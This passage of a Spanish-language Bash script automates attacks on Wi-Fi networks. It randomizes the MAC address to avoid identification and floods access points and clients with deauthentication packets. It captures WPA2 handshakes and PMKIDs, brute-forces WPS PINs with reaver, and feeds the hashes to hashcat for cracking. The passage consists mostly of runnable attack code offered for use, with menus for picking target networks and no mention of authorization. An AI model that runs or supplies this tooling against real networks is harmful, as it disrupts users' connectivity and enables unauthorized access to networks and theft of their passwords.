                ;;
            6) break ;;
            *) print_error "Opción inválida." ;;
        esac
    done
}

# =============================================================================
# ATAQUE WPS
# =============================================================================
wps_attack() {
    local bssid="$1"
    local channel="$2"
    local iface="$3"
    local term_pid=""
    
    if ! command -v reaver &>/dev/null; then
        print_error "reaver no está instalado. Instálalo con: sudo apt install reaver"
        return 1
    fi
    
    print_msg "Iniciando ataque WPS con reaver..."
    print_info "Esto puede tardar mucho (hasta varias horas)."
    print_warning "Asegúrate de que el router tiene WPS activado (ver con 'wash -i $iface')."
    print_info "Presiona Ctrl+C en esta terminal para cancelar el ataque."
    
    local reaver_cmd="reaver -i $iface -b $bssid -c $channel -vv"
    
    if $USE_GUI_TERMINAL; then
        apply_bspwm_floating_rule
        $TERMINAL_CMD bash -c "$reaver_cmd; echo 'Presiona Enter para cerrar esta ventana...'; read" &
        term_pid=$!
        EXTRA_PIDS+=("$term_pid")
        print_msg "Reaver ejecutándose en ventana flotante (PID $term_pid)."
        print_msg "Esperando a que termine el ataque WPS (ventana abierta)..."
        wait $term_pid
    else
        print_msg "Ejecutando reaver en primer plano..."
        eval "$reaver_cmd"
    fi
}

# =============================================================================
# LIMPIEZA FINAL
# =============================================================================
cleanup() {
    local exit_code=$?
    
    if [ $_CLEANUP_DONE -eq 1 ]; then
        return
    fi
    _CLEANUP_DONE=1
    
    print_warning "Limpiando y restaurando configuración..."

    if [ -n "$AIRODUMP_PID" ]; then
        kill_airodump "$AIRODUMP_PID" "$SELECTED_SSID"
    fi
    pkill -P $$ 2>/dev/null

    if [ -n "$MON_INTERFACE" ] && [ "$MON_INTERFACE" != "$INTERFACE" ] && iw dev 2>/dev/null | grep -q "$MON_INTERFACE"; then
        airmon-ng stop "$MON_INTERFACE" > /dev/null 2>&1
    fi

    if [ -n "$INTERFACE" ]; then
        ip link set "$INTERFACE" down
        macchanger -p "$INTERFACE" > /dev/null 2>&1
        ip link set "$INTERFACE" up
    fi

    systemctl start NetworkManager 2>/dev/null || service network-manager start 2>/dev/null

    for file in "${TEMP_FILES[@]}"; do
        [ -f "$file" ] && rm -f "$file"
    done

    if [ -d "$TEMP_DIR" ]; then
        rm -rf "$TEMP_DIR"
        print_msg "Directorio temporal eliminado: $TEMP_DIR"
    fi

    for pid in "${EXTRA_PIDS[@]}"; do
        if kill -0 "$pid" 2>/dev/null; then
            kill "$pid" 2>/dev/null
            wait "$pid" 2>/dev/null
        fi
    done

    if [ -n "$SELECTED_BSSID" ]; then
        pkill -f "reaver.*$SELECTED_BSSID" 2>/dev/null
    fi

    print_success "Limpieza completada. Adios"
    exit $exit_code
}

trap cleanup SIGINT SIGTERM EXIT

# =============================================================================
# INICIO DEL SCRIPT
# =============================================================================
if [ "$EUID" -ne 0 ]; then
    print_error "Ejecuta con sudo."
    exit 1
fi

INTERFACE=$(iw dev | grep -oP 'Interface \K\w+' | head -1)
if [ -z "$INTERFACE" ]; then
    print_error "No se encontró interfaz inalámbrica."
    exit 1
fi
print_msg "Interfaz: $INTERFACE"
ORIGINAL_MAC=$(cat /sys/class/net/"$INTERFACE"/address)
print_msg "MAC original: $ORIGINAL_MAC"

detect_gui_terminal
if $USE_GUI_TERMINAL; then
    print_msg "Usando terminal gráfica: $TERMINAL_CMD"
fi

# Instalación de paquetes necesarios
REQUIRED_PKGS=("aircrack-ng" "macchanger" "hcxdumptool" "hcxtools" "hashcat" "wpasupplicant")
for pkg in "${REQUIRED_PKGS[@]}"; do
    if ! dpkg -l | grep -qw "$pkg"; then
        print_msg "Instalando $pkg..."
        apt-get update -qq && apt-get install -y "$pkg" > /dev/null
    fi
done

if ! command -v aireplay-ng &>/dev/null; then
    print_error "aireplay-ng no encontrado. Asegúrate de que aircrack-ng está instalado."
    exit 1
fi

print_msg "Deteniendo procesos conflictivos..."
airmon-ng check kill > /dev/null
systemctl stop NetworkManager 2>/dev/null || service network-manager stop 2>/dev/null

print_msg "Cambiando MAC aleatoria..."
ip link set "$INTERFACE" down
macchanger -r "$INTERFACE" > /dev/null
ip link set "$INTERFACE" up
print_success "Nueva MAC: $(macchanger -s "$INTERFACE" | grep 'Current' | awk '{print $3}')"

# =============================================================================
# MENÚ PRINCIPAL
# =============================================================================
while true; do
    echo ""
    print_msg "=== MENÚ PRINCIPAL ==="
    echo "  1. Ataque combinado (Handshake + PMKID)"
    echo "  2. Escanear redes vulnerables (PMKID detector)"
    echo "  3. Capturar Handshake (con detección WPA2/WPA3)"
    echo "  4. Ataque WPS"
    echo "  5. Crackear hash existente"
    echo "  6. Gestionar diccionarios"
    echo "  7. Salir"
    read -p "Selecciona (1-7): " main_choice

    case "$main_choice" in
        1|3)
            # ===== CÓDIGO COMPLETO DE CAPTURA =====
            # Activar modo monitor para escaneo inicial
            print_msg "Iniciando modo monitor para escaneo..."
            MON_INTERFACE=$(get_monitor_interface "$INTERFACE")
            if [ -z "$MON_INTERFACE" ]; then
                print_error "No se pudo crear la interfaz monitor."
                restore_network
                continue
            fi
            print_success "Modo monitor: $MON_INTERFACE"

            # Escaneo con airodump
            print_msg "Abriendo airodump para escaneo (ventana flotante)..."
            if $USE_GUI_TERMINAL; then
                apply_bspwm_floating_rule
                $TERMINAL_CMD bash -c "airodump-ng -w $SCAN_BASE $MON_INTERFACE; echo 'Presiona Enter para cerrar...'; read" &
                AIRODUMP_PID=$!
            else
                airodump-ng -w "$SCAN_BASE" "$MON_INTERFACE" > /dev/null 2>&1 &
                AIRODUMP_PID=$!
            fi
            sleep 3

            echo ""
            read -p "ESSID (nombre de la red): " raw_ssid
            read -p "Canal: " SELECTED_CHANNEL

            SAFE_SSID=$(sanitize_name "$raw_ssid")
            SELECTED_SSID="$raw_ssid"
            OUTPUT_DIR="./$SAFE_SSID"
            mkdir -p "$OUTPUT_DIR"

            CSV_FILE="${SCAN_BASE}-01.csv"
            if [ ! -f "$CSV_FILE" ]; then
                print_error "Archivo de escaneo no encontrado."
                kill_airodump "$AIRODUMP_PID" "$SCAN_BASE"
                restore_network
                continue
            fi

            INFO=$(get_network_info_from_csv "$CSV_FILE" "$SELECTED_SSID" "$SELECTED_CHANNEL")
            SELECTED_BSSID=$(echo "$INFO" | cut -d'|' -f1)
            SELECTED_ENCRYPTION=$(echo "$INFO" | cut -d'|' -f2)

            if [ -z "$SELECTED_BSSID" ]; then
                print_error "No se encontró BSSID."
                kill_airodump "$AIRODUMP_PID" "$SCAN_BASE"
                restore_network
                continue
            fi

            print_success "BSSID: $SELECTED_BSSID"
            print_success "Encriptación: $SELECTED_ENCRYPTION"

            kill_airodump "$AIRODUMP_PID" "$SCAN_BASE"
            TEMP_FILES+=("$CSV_FILE" "${SCAN_BASE}-01.kismet.csv" "${SCAN_BASE}-01.kismet.netxml")

            # Detectar tipo de red
            IS_WPA3=false
            if detect_wpa3 "$SELECTED_ENCRYPTION"; then
                IS_WPA3=true
                print_warning "Red con capacidades WPA3 detectada."
            fi
            IS_TRANSITION=false
            if detect_transition_mode "$SELECTED_ENCRYPTION"; then
                IS_TRANSITION=true
                print_info "Modo transición WPA2/WPA3."
            fi

            # Verificar PMF si es WPA2 puro
            if [ "$IS_WPA3" = false ] && [ "$IS_TRANSITION" = false ]; then
                if check_pmf_enabled "$SELECTED_BSSID" "$SELECTED_CHANNEL" "$MON_INTERFACE"; then
                    print_warning "PMF detectado: los clientes modernos ignorarán deauth falsos."
                    print_info "Recomendaciones:"
                    echo "  - Usar un cliente antiguo (portátil con Linux antiguo, Windows 7, etc.)"
                    echo "  - Captura pasiva prolongada (esperar reconexión real)"
                    echo "  - Intentar ataque PMKID (ya se hará en opción combinada)"
                fi
            fi

            # ===== OPCIÓN 1: ATAQUE COMBINADO =====
            if [ "$main_choice" == "1" ]; then
                print_msg "=== ATAQUE COMBINADO (Handshake + PMKID) ==="
                HASH_HS=""
                if [ "$IS_WPA3" = true ] && [ "$IS_TRANSITION" = false ]; then
                    print_warning "Red WPA3 pura: no se puede capturar handshake tradicional."
                else
                    # Handshake
                    print_msg "Fase 1: Captura de Handshake"
                    if [ -z "$MON_INTERFACE" ] || ! iw dev 2>/dev/null | grep -q "$MON_INTERFACE"; then
                        MON_INTERFACE=$(get_monitor_interface "$INTERFACE")
                        if [ -z "$MON_INTERFACE" ]; then
                            print_error "No se pudo crear interfaz monitor."
                            restore_network
                            continue 2
                        fi
                    fi
                    
                    check_injection || print_warning "La inyección podría no funcionar. Continuando..."
                    
                    iw dev "$MON_INTERFACE" set channel "$SELECTED_CHANNEL" > /dev/null 2>&1
                    CAP_FILE="${OUTPUT_DIR}/captura_handshake_${SAFE_SSID}_$$-01.cap"
                    HS_HASH="${OUTPUT_DIR}/handshake_${SAFE_SSID}.22000"
                    
                    if $USE_GUI_TERMINAL; then
                        apply_bspwm_floating_rule
                        $TERMINAL_CMD bash -c "airodump-ng -c $SELECTED_CHANNEL --bssid $SELECTED_BSSID -w ${OUTPUT_DIR}/captura_handshake_${SAFE_SSID}_$$ $MON_INTERFACE; echo 'Ventana cerrada. Presiona Enter...'; read" &
                        AIRODUMP_PID=$!
                    else
                        airodump-ng -c "$SELECTED_CHANNEL" --bssid "$SELECTED_BSSID" -w "${OUTPUT_DIR}/captura_handshake_${SAFE_SSID}_$$" "$MON_INTERFACE" > /dev/null 2>&1 &
                        AIRODUMP_PID=$!
                    fi
                    
                    echo ""
                    print_msg "OPCIONES DE DEAUTENTICACIÓN:"
                    echo "  0. No realizar deautenticación"
                    echo "  1. Ataque limitado (enviar X paquetes a broadcast)"
                    echo "  2. Ataque continuo (hasta que se detecte handshake) a broadcast"
                    echo "  3. Ataque a cliente específico (si conoces MAC)"
                    read -p "Selecciona (0-3): " deauth_option
                    
                    DEAUTH_PID=""
                    case "$deauth_option" in
                        1)
                            read -p "Número de paquetes (defecto 10): " deauth_packets
                            deauth_packets=${deauth_packets:-10}
                            print_msg "Enviando $deauth_packets paquetes de deautenticación..."
                            aireplay-ng -0 "$deauth_packets" -a "$SELECTED_BSSID" "$MON_INTERFACE" --ignore-negative-one > /dev/null 2>&1 &
                            DEAUTH_PID=$!
                            ;;
                        2)
                            print_msg "Iniciando ataque continuo. El script seguirá esperando el handshake."
                            aireplay-ng -0 0 -a "$SELECTED_BSSID" "$MON_INTERFACE" --ignore-negative-one > /dev/null 2>&1 &
                            DEAUTH_PID=$!
                            ;;
                        3)
                            read -p "MAC del cliente (ej. AA:BB:CC:DD:EE:FF): " client_mac
                            aireplay-ng -0 5 -a "$SELECTED_BSSID" -c "$client_mac" "$MON_INTERFACE" --ignore-negative-one > /dev/null 2>&1 &
                            DEAUTH_PID=$!
                            ;;
                    esac
                    
                    print_msg "Esperando handshake (máx 120s). Puedes ver el progreso en la ventana de airodump..."
                    HANDSHAKE_DETECTED=false
                    for i in {1..24}; do
                        sleep 5
                        if [ -f "$CAP_FILE" ]; then
                            size=$(du -h "$CAP_FILE" 2>/dev/null | cut -f1)
                            echo -ne "\r[$(date +%H:%M:%S)] Tamaño captura: $size   "
                            if aircrack-ng "$CAP_FILE" 2>/dev/null | grep -q "1 handshake"; then
                                echo ""
                                print_success "Handshake detectado!"
                                HANDSHAKE_DETECTED=true
                                break
                            fi
                        fi
                    done
                    echo ""
                    
                    if [ -n "$DEAUTH_PID" ] && kill -0 "$DEAUTH_PID" 2>/dev/null; then
                        kill "$DEAUTH_PID" 2>/dev/null
                        wait "$DEAUTH_PID" 2>/dev/null
                    fi
                    
                    kill_airodump "$AIRODUMP_PID" "$SAFE_SSID"
                    
                    if [ "$HANDSHAKE_DETECTED" = true ]; then
                        hcxpcapngtool -o "$HS_HASH" "$CAP_FILE" > /dev/null 2>&1
                        if [ -s "$HS_HASH" ]; then
                            print_success "Hash handshake guardado: $HS_HASH"
                            HASH_HS="$HS_HASH"
                            # Copiar a carpeta central de hashes
                            mkdir -p "$HASH_DIR"
                            cp "$HS_HASH" "$HASH_DIR/"
                            print_success "Hash copiado a $HASH_DIR/$(basename "$HS_HASH")"
                        fi
                    else
                        print_warning "No se detectó handshake en 120 segundos."
                        read -p "¿Quieres intentar una captura pasiva prolongada (minutos)? (0 para no): " long_min
                        if [ "$long_min" -gt 0 ]; then
                            print_msg "Abriendo ventana para captura pasiva de ${long_min} minutos..."
                            local long_cap_file="${OUTPUT_DIR}/captura_larga_${SAFE_SSID}_$$"
                            
                            if $USE_GUI_TERMINAL; then
                                apply_bspwm_floating_rule
                                $TERMINAL_CMD bash -c "timeout ${long_min}m airodump-ng -c $SELECTED_CHANNEL --bssid $SELECTED_BSSID -w $long_cap_file $MON_INTERFACE; echo 'Captura finalizada. Presiona Enter...'; read" &
                                local long_pid=$!
                                EXTRA_PIDS+=("$long_pid")
                                wait $long_pid
                            else
                                timeout "${long_min}m" airodump-ng -c "$SELECTED_CHANNEL" --bssid "$SELECTED_BSSID" -w "$long_cap_file" "$MON_INTERFACE"
                            fi
                            
                            if [ -f "${long_cap_file}-01.cap" ]; then
                                if aircrack-ng "${long_cap_file}-01.cap" 2>/dev/null | grep -q "1 handshake"; then
                                    print_success "Handshake detectado en captura larga."
                                    hcxpcapngtool -o "$HS_HASH" "${long_cap_file}-01.cap" > /dev/null 2>&1
                                    HASH_HS="$HS_HASH"
                                    HANDSHAKE_DETECTED=true
                                    mkdir -p "$HASH_DIR"
                                    cp "$HS_HASH" "$HASH_DIR/"
                                    print_success "Hash copiado a $HASH_DIR/$(basename "$HS_HASH")"
                                else
                                    print_warning "No se detectó handshake en captura larga."
                                fi
                                rm -f "${long_cap_file}-01.cap"
                            else
                                print_warning "No se generó archivo de captura."
                            fi
                        fi
                    fi
                fi

                # ===== FASE 2: PMKID =====
                HASH_PM=""
                if [ "$IS_WPA3" = true ] && [ "$IS_TRANSITION" = false ]; then
                    print_warning "Red WPA3 pura: no se puede realizar ataque PMKID."
                else
                    print_msg "Fase 2: Captura de PMKID"
                    restore_network
                    ip link set "$INTERFACE" up
                    MON_INTERFACE="$INTERFACE"
                    
                    BSSID_FILE="${OUTPUT_DIR}/bssid_pmkid_$$.txt"
                    echo "$SELECTED_BSSID" > "$BSSID_FILE"
                    TEMP_FILES+=("$BSSID_FILE")
                    
                    PM_PCAP="${OUTPUT_DIR}/pmkid_capture_${SAFE_SSID}_$$.pcapng"
                    PM_HASH="${OUTPUT_DIR}/pmkid_${SAFE_SSID}.22000"
                    
                    read -p "Segundos para captura PMKID (defecto 60, recomendado 60-120): " pm_time
                    pm_time=${pm_time:-60}
                    
                    print_msg "Capturando PMKID durante $pm_time segundos..."
                    timeout "$pm_time" hcxdumptool -i "$MON_INTERFACE" -o "$PM_PCAP" \
                        --filterlist_ap="$BSSID_FILE" --filtermode=2 --enable_status=1 > /dev/null 2>&1
                    
                    hcxpcapngtool -o "$PM_HASH" "$PM_PCAP" > /dev/null 2>&1
                    if [ -s "$PM_HASH" ]; then
                        print_success "PMKID capturado: $PM_HASH"
                        HASH_PM="$PM_HASH"
                        mkdir -p "$HASH_DIR"
                        cp "$PM_HASH" "$HASH_DIR/"
                        print_success "Hash copiado a $HASH_DIR/$(basename "$PM_HASH")"
                    else
                        print_error "No se capturó PMKID."
                    fi
                    rm -f "$PM_PCAP"
                fi

                restore_network

                # ===== OFRECER CRACKING =====
                if [ -n "$HASH_HS" ]; then
                    cracking_menu "$HASH_HS" "22000" "$OUTPUT_DIR" "${SAFE_SSID}_handshake"
                fi
                if [ -n "$HASH_PM" ]; then
                    cracking_menu "$HASH_PM" "16800" "$OUTPUT_DIR" "${SAFE_SSID}_pmkid"
                fi
            fi

            # ===== OPCIÓN 3: SOLO HANDSHAKE =====
            if [ "$main_choice" == "3" ]; then
                print_msg "=== CAPTURA DE HANDSHAKE ==="
                if [ "$IS_WPA3" = true ] && [ "$IS_TRANSITION" = false ]; then
                    print_error "Red WPA3 pura. No se puede capturar handshake tradicional."
                    print_info "Ofreciendo opciones para WPA3..."
                    echo ""
                    print_msg "Opciones para WPA3:"
                    echo "  1. Capturar tráfico SAE para análisis"
                    echo "  2. Probar conexión SAE (requiere contraseña)"
                    echo "  3. Volver"
                    read -p "Selecciona: " wpa3_opt
                    case "$wpa3_opt" in
                        1)
                            restore_network
                            ip link set "$INTERFACE" up
                            MON_INTERFACE="$INTERFACE"
                            SAE_PCAP="${OUTPUT_DIR}/sae_capture_${SAFE_SSID}_$$.pcapng"
                            read -p "Segundos de captura (defecto 60): " sae_time
                            sae_time=${sae_time:-60}
                            timeout "$sae_time" hcxdumptool -i "$MON_INTERFACE" -o "$SAE_PCAP" \
                                --filterlist_ap="$SELECTED_BSSID" --filtermode=2 > /dev/null 2>&1
                            print_success "Captura SAE guardada: $SAE_PCAP"
                            ;;
                        2)
                            restore_network
                            ip link set "$INTERFACE" up
                            read -sp "Contraseña de la red: " wpa3_pass
                            echo
                            CONF_FILE="${OUTPUT_DIR}/wpa_supplicant_$$.conf"
                            cat > "$CONF_FILE" <<EOF
network={
    ssid="$SELECTED_SSID"
    key_mgmt=SAE
    sae_password="$wpa3_pass"
    ieee80211w=2
}
EOF
                            print_msg "Intentando conexión SAE (wpa_supplicant)..."
                            sudo -u "$ORIGINAL_USER" wpa_supplicant -i "$INTERFACE" -c "$CONF_FILE" -dd
                            rm -f "$CONF_FILE"
                            ;;
                        3) ;;
                    esac
                else
                    # Red WPA2 o mixta: capturar handshake
                    if [ -z "$MON_INTERFACE" ] || ! iw dev 2>/dev/null | grep -q "$MON_INTERFACE"; then
                        MON_INTERFACE=$(get_monitor_interface "$INTERFACE")
                        if [ -z "$MON_INTERFACE" ]; then
                            print_error "No se pudo crear interfaz monitor."
                            restore_network
                            continue 2
                        fi
                    fi
                    
                    check_injection || print_warning "La inyección podría no funcionar. Continuando..."
                    
                    iw dev "$MON_INTERFACE" set channel "$SELECTED_CHANNEL" > /dev/null 2>&1
                    CAP_FILE="${OUTPUT_DIR}/captura_handshake_${SAFE_SSID}_$$-01.cap"
                    HS_HASH="${OUTPUT_DIR}/handshake_${SAFE_SSID}.22000"
                    
                    if $USE_GUI_TERMINAL; then
                        apply_bspwm_floating_rule
                        $TERMINAL_CMD bash -c "airodump-ng -c $SELECTED_CHANNEL --bssid $SELECTED_BSSID -w ${OUTPUT_DIR}/captura_handshake_${SAFE_SSID}_$$ $MON_INTERFACE; echo 'Ventana cerrada. Presiona Enter...'; read" &
                        AIRODUMP_PID=$!
                    else
                        airodump-ng -c "$SELECTED_CHANNEL" --bssid "$SELECTED_BSSID" -w "${OUTPUT_DIR}/captura_handshake_${SAFE_SSID}_$$" "$MON_INTERFACE" > /dev/null 2>&1 &
                        AIRODUMP_PID=$!
                    fi
                    
                    echo ""
                    print_msg "OPCIONES DE DEAUTENTICACIÓN:"
                    echo "  0. No realizar deautenticación"
                    echo "  1. Ataque limitado (enviar X paquetes a broadcast)"
                    echo "  2. Ataque continuo (hasta que se detecte handshake) a broadcast"
                    echo "  3. Ataque a cliente específico (si conoces MAC)"
                    read -p "Selecciona (0-3): " deauth_option
                    
                    DEAUTH_PID=""
                    case "$deauth_option" in
                        1)
                            read -p "Número de paquetes (defecto 10): " deauth_packets
                            deauth_packets=${deauth_packets:-10}
                            print_msg "Enviando $deauth_packets paquetes de deautenticación..."
                            aireplay-ng -0 "$deauth_packets" -a "$SELECTED_BSSID" "$MON_INTERFACE" --ignore-negative-one > /dev/null 2>&1 &
                            DEAUTH_PID=$!
                            ;;
                        2)
                            print_msg "Iniciando ataque continuo. El script seguirá esperando el handshake."
                            aireplay-ng -0 0 -a "$SELECTED_BSSID" "$MON_INTERFACE" --ignore-negative-one > /dev/null 2>&1 &
                            DEAUTH_PID=$!
                            ;;
                        3)
                            read -p "MAC del cliente (ej. AA:BB:CC:DD:EE:FF): " client_mac
                            aireplay-ng -0 5 -a "$SELECTED_BSSID" -c "$client_mac" "$MON_INTERFACE" --ignore-negative-one > /dev/null 2>&1 &
                            DEAUTH_PID=$!
                            ;;
                    esac
                    
                    print_msg "Esperando handshake (máx 120s). Puedes ver el progreso en la ventana de airodump..."
                    HANDSHAKE_DETECTED=false
                    for i in {1..24}; do
                        sleep 5
                        if [ -f "$CAP_FILE" ]; then
                            size=$(du -h "$CAP_FILE" 2>/dev/null | cut -f1)
                            echo -ne "\r[$(date +%H:%M:%S)] Tamaño captura: $size   "
                            if aircrack-ng "$CAP_FILE" 2>/dev/null | grep -q "1 handshake"; then
                                echo ""
                                print_success "Handshake detectado!"
                                HANDSHAKE_DETECTED=true
                                break
                            fi
                        fi
                    done
                    echo ""
                    
                    if [ -n "$DEAUTH_PID" ] && kill -0 "$DEAUTH_PID" 2>/dev/null; then
                        kill "$DEAUTH_PID" 2>/dev/null
                        wait "$DEAUTH_PID" 2>/dev/null
                    fi
                    
                    kill_airodump "$AIRODUMP_PID" "$SAFE_SSID"
                    
                    if [ "$HANDSHAKE_DETECTED" = false ]; then
                        read -p "¿Quieres intentar una captura pasiva prolongada (minutos)? (0 para no): " long_min
                        if [ "$long_min" -gt 0 ]; then
                            print_msg "Abriendo ventana para captura pasiva de ${long_min} minutos..."
                            local long_cap_file="${OUTPUT_DIR}/captura_larga_${SAFE_SSID}_$$"
                            
                            if $USE_GUI_TERMINAL; then
                                apply_bspwm_floating_rule
                                $TERMINAL_CMD bash -c "timeout ${long_min}m airodump-ng -c $SELECTED_CHANNEL --bssid $SELECTED_BSSID -w $long_cap_file $MON_INTERFACE; echo 'Captura finalizada. Presiona Enter...'; read" &
                                local long_pid=$!
                                EXTRA_PIDS+=("$long_pid")
                                wait $long_pid
                            else
                                timeout "${long_min}m" airodump-ng -c "$SELECTED_CHANNEL" --bssid "$SELECTED_BSSID" -w "$long_cap_file" "$MON_INTERFACE"
                            fi
                            
                            if [ -f "${long_cap_file}-01.cap" ]; then
                                if aircrack-ng "${long_cap_file}-01.cap" 2>/dev/null | grep -q "1 handshake"; then
                                    print_success "Handshake detectado en captura larga."
                                    hcxpcapngtool -o "$HS_HASH" "${long_cap_file}-01.cap" > /dev/null 2>&1
                                    HANDSHAKE_DETECTED=true
                                    mkdir -p "$HASH_DIR"
                                    cp "$HS_HASH" "$HASH_DIR/"
                                    print_success "Hash copiado a $HASH_DIR/$(basename "$HS_HASH")"
                                else
                                    print_warning "No se detectó handshake en captura larga."
                                fi
                                rm -f "${long_cap_file}-01.cap"
                            else
                                print_warning "No se generó archivo de captura."
                            fi
                        fi
                    fi
                    
                    restore_network
                    
                    if [ "$HANDSHAKE_DETECTED" = true ] && [ -s "$HS_HASH" ]; then
                        print_success "Hash handshake guardado: $HS_HASH"
                        cracking_menu "$HS_HASH" "22000" "$OUTPUT_DIR" "$SAFE_SSID"
                    elif [ "$HANDSHAKE_DETECTED" = false ]; then
                        print_warning "No se detectó handshake."
                    fi
                fi
            fi
            ;;

        2)  # Escaneo PMKID
            print_msg "=== ESCANEO DE REDES VULNERABLES (PMKID) ==="
            restore_network
            ip link set "$INTERFACE" up
            MON_INTERFACE="$INTERFACE"
            
            OUTPUT_DIR="./escaneo_pmkid_$(date +%Y%m%d_%H%M%S)"
            mkdir -p "$OUTPUT_DIR"
            
            read -p "Tiempo de escaneo (segundos, defecto 60): " scan_time
            scan_time=${scan_time:-60}
            
            scan_for_pmkid "$scan_time"
            
            restore_network
            ;;

        4)  # Ataque WPS
            print_msg "=== ATAQUE WPS ==="
            print_msg "Iniciando modo monitor para escanear redes..."
            MON_INTERFACE=$(get_monitor_interface "$INTERFACE")
            if [ -z "$MON_INTERFACE" ]; then
                print_error "No se pudo crear la interfaz monitor."
                restore_network
                continue
            fi
            print_success "Modo monitor: $MON_INTERFACE"

            print_msg "Escaneando redes con airodump (10s)..."
            timeout 10 airodump-ng -w "$TEMP_DIR/wps_scan" "$MON_INTERFACE" > /dev/null 2>&1
            
            if [ ! -f "$TEMP_DIR/wps_scan-01.csv" ]; then
                print_error "No se pudo escanear."
                restore_network
                continue
            fi
            
            echo ""
            cat "$TEMP_DIR/wps_scan-01.csv" | awk -F',' 'NR>2 && $14!="" {print "  " NR-2 ". " $14 " (" $1 ") Canal " $4}' | head -20
            echo ""
            read -p "Selecciona el número de la red (o 0 para cancelar): " net_num
            if [ "$net_num" -eq 0 ]; then
                restore_network
                continue
            fi
            
            bssid=$(awk -F',' -v n="$net_num" 'NR==n+2 {gsub(/^[[:space:]]+|[[:space:]]+$/, "", $1); print $1}' "$TEMP_DIR/wps_scan-01.csv")
            channel=$(awk -F',' -v n="$net_num" 'NR==n+2 {gsub(/^[[:space:]]+|[[:space:]]+$/, "", $4); print $4}' "$TEMP_DIR/wps_scan-01.csv")
            
            if [ -z "$bssid" ]; then
                print_error "BSSID no válido."
                restore_network
                continue
            fi
            
            print_success "Objetivo: $bssid (Canal $channel)"
            SELECTED_BSSID="$bssid"
            wps_attack "$bssid" "$channel" "$MON_INTERFACE"
            restore_network
            ;;
            
        5)  # Crackear hash existente
            print_msg "=== CRACKEAR HASH EXISTENTE ==="
            mkdir -p "$HASH_DIR"
            shopt -s nullglob

            echo ""
            print_msg "Opciones de selección:"
            echo "  1. Usar un hash de la carpeta $HASH_DIR"
            echo "  2. Especificar ruta manual del hash"
            read -p "Selecciona (1-2): " hash_choice

            hash_file=""
            mode=""

            case "$hash_choice" in
                1)
                    hash_files=("$HASH_DIR"/*.{22000,16800})
                    if [ ${#hash_files[@]} -eq 0 ]; then
                        print_error "No hay archivos .22000 o .16800 en $HASH_DIR."
                        print_info "Puedes copiar tus hashes allí."
                        continue
                    fi
                    echo ""
                    print_msg "Hashes disponibles:"
                    i=1
                    file_list=()
                    for f in "${hash_files[@]}"; do
                        echo "  $i. $(basename "$f")"
                        file_list+=("$f")
                        ((i++))
                    done
                    read -p "Selecciona el número (1-${#file_list[@]}): " file_num
                    if [[ "$file_num" =~ ^[0-9]+$ ]] && [ "$file_num" -ge 1 ] && [ "$file_num" -le ${#file_list[@]} ]; then
                        hash_file="${file_list[$((file_num-1))]}"
                    else
                        print_error "Número inválido."
                        continue
                    fi
                    ;;
                2)
                    read -p "Introduce la ruta completa al archivo hash: " hash_file
                    if [ ! -f "$hash_file" ]; then
                        print_error "Archivo no encontrado."
                        continue
                    fi
                    ;;
                *)
                    print_error "Opción inválida."
                    continue
                    ;;
            esac

            case "$hash_file" in
                *.22000) mode="22000" ;;
                *.16800) mode="16800" ;;
                *)
                    print_warning "No se pudo determinar el modo por extensión."
                    read -p "Introduce el modo hashcat (22000 o 16800): " mode
                    if [[ "$mode" != "22000" && "$mode" != "16800" ]]; then
                        print_error "Modo inválido."
                        continue
                    fi
                    ;;
            esac

            out_dir="./cracking_$(date +%Y%m%d_%H%M%S)"
            mkdir -p "$out_dir"
            print_msg "Resultados se guardarán en: $out_dir"

            cracking_menu "$hash_file" "$mode" "$out_dir" "hash_$(basename "$hash_file" | sed 's/\.[^.]*$//')"
            ;;

        6)  gestionar_diccionarios
            ;;

        7)  cleanup
            exit 0
            ;;

        *)
            print_error "Opción inválida."
            ;;
    esac
done
